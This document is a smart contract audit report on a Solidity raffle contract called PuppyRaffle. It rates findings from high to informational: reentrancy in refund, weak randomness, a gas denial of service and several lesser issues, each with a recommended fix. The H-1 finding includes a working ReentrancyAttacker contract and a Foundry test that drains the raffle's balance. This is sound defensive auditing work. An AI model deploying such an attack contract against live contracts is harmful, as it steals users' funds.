### [H-1] Reentrancy attack in `PuppyRaffle::refund` allows entrant to drain raffle balance

**Description:** The `PuppyRaffle::refund` function does not follow CEI (Checks, Effects, Interactions) and as a result, enables participants to drain the contract balance.

In the `PuppyRaffle::refund` function, we first make an external call to the `msg.sender` address and only after making that external call do we update the `PuppyRaffle::players` array.

```javascript
function refund(uint256 playerIndex) public {
    address playerAddress = players[playerIndex];
    require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
    require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");

@>  payable(msg.sender).sendValue(entranceFee);
@>  players[playerIndex] = address(0);

    emit RaffleRefunded(playerAddress);
}
```

A player who has entered the raffle could have a `fallback`/`receive` function that calls the `PuppyRaffle::refund` function again and claim another refund. They could continue the cycle till the contract balance is drained.

**Impact:** All fees paid by raffle entrants could be stolen by the malicious participant.

**Proof of Concept:**

1. User enters the raffle
2. Attacker sets up a contract with a `fallback` function that calls `PuppyRaffle::refund`
3. Attacker enters the raffle
4. Attacker calls `PuppyRaffle::refund` from their attack contract, draining the contract balance.

<details>
<summary>code</summary>

Place the following into `PuppyRaffleTest.t.sol`

```javascript
function test_ReentrancyRefund() public {
    address[] memory players = new address[](4);
    players[0] = playerOne;
    players[1] = playerTwo;
    players[2] = playerThree;
    players[3] = playerFour;
    puppyRaffle.enterRaffle{value: entranceFee * 4}(players);

    ReentrancyAttacker attackerContract = new ReentrancyAttacker(puppyRaffle);
    address attackUser = makeAddr("attackUser");
    vm.deal(attackUser, 1 ether);

    uint256 startingAttack = address(attackerContract).balance;
    uint256 startingContractBalance = address(puppyRaffle).balance;

    vm.prank(attackUser);
    attackerContract.attack{value: entranceFee}();

    console.log("starting attacker contract balance: ", startingAttack);
    console.log("starting contract balance: ", startingContractBalance);

    console.log("ending attacker contract balance: ", address(attackerContract).balance);
    console.log("ending contract balance: ", address(puppyRaffle).balance);
}
```

</details>

And this contract as well :

<details>
<summary>code</summary>

```javascript
contract ReentrancyAttacker {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIndex;

    receive() external payable {
        _stealMoney();
    }

    constructor(PuppyRaffle _puppyRaffle) {
        puppyRaffle = _puppyRaffle;
        entranceFee = puppyRaffle.entranceFee();
    }

    function attack() external payable {
        address[] memory players = new address[](1);
        players[0] = address(this);
        puppyRaffle.enterRaffle{value: entranceFee}(players);

        attackerIndex = puppyRaffle.getActivePlayerIndex(address(this));
        puppyRaffle.refund(attackerIndex);
    }

    function _stealMoney() internal {
        if (address(puppyRaffle).balance >= entranceFee) {
            puppyRaffle.refund(attackerIndex);
        }
    }

    fallback() external payable {
        _stealMoney();
    }
}
```

</details>

**Recommended Mitigation:** To prevent this, we should have the `PuppyRaffle::refund` function update the `players` array before making the external call. Additionally, we should have the event emission up as well.

```diff
function refund(uint256 playerIndex) public {
        address playerAddress = players[playerIndex];
        require(playerAddress == msg.sender, "PuppyRaffle: Only the player can refund");
        require(playerAddress != address(0), "PuppyRaffle: Player already refunded, or is not active");
+       players[playerIndex] = address(0);
+       emit RaffleRefunded(playerAddress);
        payable(msg.sender).sendValue(entranceFee);
-       players[playerIndex] = address(0);
-       emit RaffleRefunded(playerAddress);
}
```

## Likelihood & Impact:

- Impact: HIGH
- Likelihood: HIGH
- Severity: HIGH

### [H-2] Weak randomness in `PuppyRaffle::selectWinner` allows users to influence or predict the winner and influence or predict the winning puppy

**Description:** Hashing `msg.sender`, `block.timestamp`, and `block.difficulty` together creates a predictable find number. A predictable number is not a good random number. Malicious users can manipulate these values or know them ahead of time to choose the winner of the raffle themselves.

_Note:_ This additionally means users could front-run this function and call `refund` if they see they are not the winner.

**Impact:** Any user can influence the winner of the raffle, winning the money and selecting `rarest` puppy. Making the entire raffle worthless if it becomes a gas war as to who wins the raffles.

**Proof of Concept:**

1. Validators can know ahead of time the `block.timestamp` and `block.difficulty` and use that to predict when/how to participate.
2. User can mine/manipulate their `msg.sender` value to result in their address being used to generated the winner.
3. Users can revert their `selectWinner` transaction if they don't like the winner or resulting puppy.

Using on-chain values as a randomness seed is a well-documented attack vector in the blockchain space.

**Recommended Mitigation:** Consider using a cryptographically provable random number generator such as Chainlink VRF.

## Likelihood & Impact:

- Impact: HIGH
- Likelihood: HIGH
- Severity: HIGH

### [M-1] Looping through players array to check for duplicates in `PuppyRaffle::enterRaffle` is a potential denial of services (DoS) attack, incrementing gas costs for future entrants

**Description:** The `PuppyRaffle::enterRaffle` function loops through the `players` array to check for duplicates. However, the longer the `PuppyRaffle::players` array is, the more checks a new player will have to make. This means the gas costs for players who enter right when the raffle stats will be dramatically lower than those who enter later. Every additional address in the `players` array, is an additional check the loop will have to make.

```javascript
@>  for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

**Impact:** The gas costs for raffle entrants will greatly increase as more players enter the raffle. Discouraging later users from entering, and causing a rush at the start of a raffle to be one of the first entrants in the queue.

An attacker might make the `PuppyRaffle:entrants` array so big, that no one else enters, guaranteeing themselves the win.

**Proof of Concept:**

If we have 2 sets of 100 players enter, the gas costs will be as such:

- 1st 100 players: ~6503275 gas
- 2nd 100 players: ~18995515 gas

This more than 3x more expensive for the second 100 players.

<details>
<summary>Proof of Code</summary>
Place the following test into `PuppyRaffletTest.t.sol`.

```javascript
function test_denialOfService() public {
    vm.txGasPrice(1);
    uint256 playersNum = 100;
    address[] memory players = new address[](playersNum);
    for(uint256 i = 0; i < playersNum; i++) {
        players[i] = address(i);
    }
    uint256 gasStart = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * players.length}(players);
    uint256 gasEnd = gasleft();

    uint256 gasUsedFirst = (gasStart - gasEnd) * tx.gasprice;
    console.log("Gas cost of the first 100 players:", gasUsedFirst);

    // The 2nd 100 players
    address[] memory playersTwo = new address[](playersNum);
    for(uint256 i = 0; i < playersNum; i++) {
        playersTwo[i] = address(i + playersNum);
    }
    uint256 gasStartSecond = gasleft();
    puppyRaffle.enterRaffle{value: entranceFee * players.length}(playersTwo);
    uint256 gasEndSecond = gasleft();

    uint256 gasUsedSecond = (gasStartSecond - gasEndSecond) * tx.gasprice;
    console.log("Gas cost of the second 100 players:", gasUsedSecond);

    assert(gasUsedFirst < gasUsedSecond);
}
```

</details>

**Recommended Mitigation:** There are a few recommendations.

1. Consider allowing duplicates. Users can make new wallet addresses anyways, so a duplicate check doesn't prevent the same person from entering multiple times, only the same wallet address.
2. Consider using a mapping to check duplicates. This would allow you to check for duplicates in constant time, rather than linear time. You could have each raffle have a `uint256` id, and the mapping would be a player address mapped to the raffle Id.

```diff
+    mapping(address => uint256) public addressToRaffleId;
+    uint256 public raffleId = 0;
.
.
.
function enterRaffle(address[] memory newPlayers) public payable {
    require(msg.value == entranceFee * newPlayers.length, "PuppyRaffle: Must send enough to enter raffle");
    for (uint256 i = 0; i < newPlayers.length; i++) {
        players.push(newPlayers[i]);
+       addressToRaffleId[newPlayers[i]] = raffleId;
    }

-        // Check for duplicates
+       // Check for duplicates only from the new players
+       for (uint256 i = 0; i < newPlayers.length; i++) {
+          require(addressToRaffleId[newPlayers[i]] != raffleId, "PuppyRaffle: Duplicate player");
+       }
-        for (uint256 i = 0; i < players.length; i++) {
-            for (uint256 j = i + 1; j < players.length; j++) {
-                require(players[i] != players[j], "PuppyRaffle: Duplicate player");
-            }
-        }
    emit RaffleEnter(newPlayers);
}
.
.
.
function selectWinner() external {
+   raffleId = raffleId + 1;
    require(block.timestamp >= raffleStartTime + raffleDuration, "PuppyRaffle: Raffle not over");
```

Alternatively, you could use [OpenZeppelin's `EnumerableSet` library](https://docs.openzeppelin.com/contracts/4.x/api/utils#EnumerableSet).

## Likelihood & Impact:

- Impact: MEDIUM
- Likelihood: MEDIUM
- Severity: MEDIUM

### [L-1] `PuppyRaffle::getActivePlayerIndex` returns 0 for non-existent players and for players at index 0, causing a player at index 0 to incorrectly think they have not entered the raffle

**Description:** If a player is in the `PuppyRaffle::players` array at index 0, this will return 0, but according to the natspec, it will also return 0 if the player is not in the array.

```javascript
function getActivePlayerIndex(address player) external view returns (uint256) {
        for (uint256 i = 0; i < players.length; i++) {
            if (players[i] == player) {
                return i;
            }
        }
        return 0;
}
```

**Impact:** A player at index 0 incorrectly think they have not entered the raffle, and attempt to enter the raffle again, wasting gas.

**Proof of Concept:**

1. User enters the raffle, they are the first entrant
2. `PuppyRaffle::getActivePlayerIndex` returns 0
3. User thinks they have not entered correctly due to the function documentation.

**Recommended Mitigation:** The easiest recommendation would be to revert if the player is not in the array instead of returning 0. You could also reserve the 0th position for any competition, but a better solution might be to return an `int256` where the function returns -1 if the player is not active.

## Likelihood & Impact:

- Impact: LOW/MEDIUM
- Likelihood: HIGH/LOW
- Severity: LOW

# Gas

### [G-1] Unchanged state variables should be declared constant or immutable

**Description:** Reading from storage is much more expensive than reading from a constant or immutable variable.

**Impact:** Used more gas.

**Proof of Concept:**

<details><summary>1 Found Instances</summary>

```solidity
uint256 public raffleDuration;
.
.
string private commonImageUri
.
.
string private rareImageUri
.
.
string private legendaryImageUri
```

</details>

**Recommended Mitigation:**

- `PuppyRaffle::raffleDuration` should be `immutable` to keep the gas efficient.
- `PuppyRaffle::commonImageUri` should be `constant` to keep the gas efficient.
- `PuppyRaffle::rareImageUri` should be `constant` to keep the gas efficient.
- `PuppyRaffle::legendaryImageUri` should be `constant` to keep the gas efficient.

### [G-2] Storage variables in a loop should be cached

**Description:** Everytime you call `players.length` you read from storage.

**Impact:** reading from storage will increase the gas fees.

**Proof of Concept:**

```javascript
    for (uint256 i = 0; i < players.length - 1; i++) {
        for (uint256 j = i + 1; j < players.length; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

**Recommended Mitigation:** Use a local memory variable, which is more gas efficient.

```diff
+   uint256 playersLength = player.length;
-   for (uint256 i = 0; i < players.length - 1; i++) {
+   for (uint256 i = 0; i < playersLength - 1; i++) {
-       for (uint256 j = i + 1; j < players.length; j++) {
+       for (uint256 j = i + 1; j < playersLength; j++) {
            require(players[i] != players[j], "PuppyRaffle: Duplicate player");
        }
    }
```

### [I-1] Solidity pragma should be specific, not wide

**Description:** Using a wide version ranges such as `^0.x.y` allow compilation with newer versions of Solidity in minor versions, which may introduce unwanted behavioural changes.

**Impact:**

- Using a wide version range for Solidity pragmas may cause incompatibilities or compatibility issues in the future.
- Difficulties in debugging and maintenance due to differences in behaviour between versions.

**Proof of Concept:**

<details><summary>1 Found Instances</summary>

```solidity
pragma solidity ^0.7.6;
```

</details>

**Recommended Mitigation:** Consider using a specific version of Solidity in your contracts instead of a wide version. For example, instead of `pragma solidity ^0.8.0;`, use `pragma solidity 0.8.0;`.

## Likelihood & Impact:

- Impact: NONE
- Likelihood: HIGH
- Severity: Informational

### [I-2] Using an outdated versions of solidity is not recommended, potential security vulnerabilities

**Description:** `solc` frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks. We also recommend avoiding complex `pragma` statement.

**Impact:** Potential security vulnerabilities.

**Proof of Concept:**

```solidity
pragma solidity ^0.7.6;
```

**Recommended Mitigation:** Deploy with a recent version of Solidity (at least 0.8.0) with no known severe issues.
`0.8.29`.

```diff
- pragma solidity ^0.7.6;
+ pragma solidity 0.8.29;
```

Please see [slither](https://github.com/crytic/slither/wiki/Detector-Documentation#incorrect-versions-of-solidity) documentation for more information.

## Likelihood & Impact:

- Impact: NONE
- Likelihood: HIGH
- Severity: Informational

### [I-3] Missing checks for `address(0)` when assigning values to address state variables

**Impact:** The functions will fail to execute.

**Proof of Concept:**

<details><summary>2 Found Instances</summary>

```solidity
    feeAddress = _feeAddress;
```

```solidity
    feeAddress = newFeeAddress;
```

</details>

**Recommended Mitigation:** Check for `address(0)` when assigning values to address state variables, revert when the state is zero.

```diff
+ require(_feeAddress != address(0), "Fee address cannot be zero");
feeAddress = _feeAddress;
.
.
.
+ require(newFeeAddress != address(0), "New fee address cannot be zero");
feeAddress = newFeeAddress;
```

## Likelihood & Impact:

- Impact: NONE
- Likelihood: HIGH
- Severity: Informational

### [I-4] `PuppyRaffle::selectWinner` does not follow CEI, which is not a best practice

**Description:** It's best to keep code clean and follow CEI (Checks, Effects, Interactions).

**Recommended Mitigation:**

```diff
-       (bool success,) = winner.call{value: prizePool}("");
-       require(success, "PuppyRaffle: Failed to send prize pool to winner");
        _safeMint(winner, tokenId);
+       (bool success,) = winner.call{value: prizePool}("");
+       require(success, "PuppyRaffle: Failed to send prize pool to winner");
```

## Likelihood & Impact:

- Impact: NONE
- Likelihood: HIGH
- Severity: Informational
